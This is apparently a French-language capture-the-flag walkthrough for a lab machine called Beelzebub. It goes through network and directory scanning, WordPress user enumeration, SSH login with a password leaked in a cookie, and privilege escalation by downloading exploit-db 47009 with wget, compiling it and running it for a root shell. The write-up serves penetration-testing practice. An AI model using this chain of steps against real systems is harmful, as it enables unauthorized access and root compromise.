@[TOC](Beelzebub)


 1. `arp-scan -l` :scanner les address ,trouver la machine vulnérable 
 ![l'adress est 192.168.1.101](https://img-blog.csdnimg.cn/direct/ab3a64b7f35f4061a43d14113998d4e2.png#pic_center)

 2. `nmap -sC -sV 192.128.1.101` scanner les portes ,et on peut voir il existe 2 connexion ,22/tcp ssh et 80/tcp http
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/b082821cf6534140950f5c62f89d9cb2.png#pic_center)

 3. Ouvrir la page 192.168.1.101,et vérifier sa resources ,il n'a plus d'info. Du coup ,on prends `dirb 192.168.1.101`pour exécuter un outil de traversée de répertoires sur notre machine vulnérable et voyons ce qui apparaît :
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/14da37877a234649b6e1c9c5eb824430.png#pic_center)



![请添加图片描述](https://img-blog.csdnimg.cn/direct/c6fc0d5b754549438079f63d050646dc.png)

 4.Avec le résultat ,on ouvre la page /index.php, il a dit 'not found',mais quand on vérifie sa resource,on peut trouver l'info utile `<!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5-->`
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/e5b77cc937a94fb78ade0429bd3e3753.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/5a2d6be3107340748d90ddb8c1be56cb.png#pic_center)
6.`echo -n 'beelzebub' | md5sum` :decoder 'beelzzbub' et obtebu`d18e1e22becbd915b45e0e655429d487`
7.Ouvrir la page `http://192.168.1.101/d18e1e22becbd915b45e0e655429d487/`,mais on peut pas le ouvrir ,donc on fais encore trouver ses répertoires avec `dirsearch -u http://192.168.1.101/d18e1e22becbd915b45e0e655429d487/ -e txt html php`
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/1751355849bb4c849e7dcf8c3ee9ef14.png#pic_center)

 8. Ici ,on trouve une nouvelle page `/wp-content/uploads/`;quand on le ouvre ,cliquez sur `Talk TO VALAK`
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/a1353d707366456fad1edfce4f18271c.png#pic_center)

9. On peut voir une boîte de dialogue donc je suppose qu'il y a une requête GET-POST ici,donc on fais la contrôle de web,se concentrer sur Website,et entrer votre nom comme 'lisa'.
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/0dd4d69a07074f07b11de955f02cb3ca.png#pic_center)

10. Cliquez index.php et puis header,vérifiez les infos,dans 'response headers'--'Set-Cookie',il existe deux 'Set--Cookie',le deuxième écrit avec 'Password=M4k3Ad3a1'(C'est le mot de pass de ssh)
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/b816b77cfcf74cf38557bfb44f248802.png#pic_center)

 11. On a également besoin du nom d'utilisateur pour la connexion de ssh,avev l'outil 'wpscan'，scanner le site WordPress spécifié et effectuer l'énumération des utilisateurs, ignorer les redirections principales et forcer l'exécution de la numérisation.`wpscan --url http://192.168.1.101/d18e1e22becbd915b45e0e655429d487/ -e u --ignore-main-redirect --force`
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/c6bbcf1e175843079a4505246638398f.png#pic_center)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/6c719327fd6c46a7a3f83abb379760b3.png#pic_center)

 12. On dirait que nous en avons trouvé deux. Nous utiliserons le nom d'utilisateur « krampus » pour notre connexion ssh.`ssh krampus@192.168.1.101` et on a réussi de connecter .Mais on n'a pas privilèges root.
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/49f7babe03a94bde856bc56ddde739a4.png#pic_center)
13.Vérifier tout les documents `ls -all`,et on peut trouver `.bash_history`，On dirait qu'il enregistre les commandes utilisés. On fait `cat .bash_history` et puis dans les résultats ,il est facile de trouver un commande de `'weget https://www.exploit-db.com/downloads/47009'`.
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/2ec732aac8c54317858b3feeb6dc31fe.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/5709e1d31b2e4e24a097f937bc374a9f.png#pic_center)
14.Exécuter `weget https://www.exploit-db.com/downloads/47009`,et `ls`,on peut trouver un CVE 47009 dans la liste,(chercher cve47009,on peut vérifier il est écrit par langue C),donc on renomme 47009 avec `mv 47009 ./cve.c`,compile et exécute .
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/c6329e2a98b941de8f3b49047631af7f.png#pic_center)
15. Réussi d’exécuter ,et on peut voir opening root shell.Avec `whoami`son résultat est 'root',Cela signifie que on a relevé le défi!


